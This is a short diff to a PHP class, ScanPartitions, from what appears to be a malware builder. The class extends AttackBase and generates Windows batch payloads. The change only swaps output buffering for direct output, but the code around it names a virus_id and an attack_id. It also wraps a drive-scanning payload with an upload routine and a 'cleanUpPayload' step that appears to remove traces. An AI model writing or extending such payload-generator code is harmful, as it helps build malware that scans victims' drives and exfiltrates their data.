@@ -24,8 +24,8 @@ class ScanPartitions extends AttackBase {
         $this->availableDrives = $availableDrives;
     }
 
-    public function generateBatchCode(): string {
-        ob_start(); //@formatter:off ?>
+    public function generateBatchCode(): void {
+        //@formatter:off ?>
         @echo off
         SetLocal EnableDelayedExpansion
         chCp 65001
@@ -37,7 +37,7 @@ class ScanPartitions extends AttackBase {
         <?php
         echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
         echo BaseScriptWin::cleanUpPayload();
-        return ob_get_clean(); //@formatter:on
+        //@formatter:on
     }
 
     private function generateUploadCode(): string {
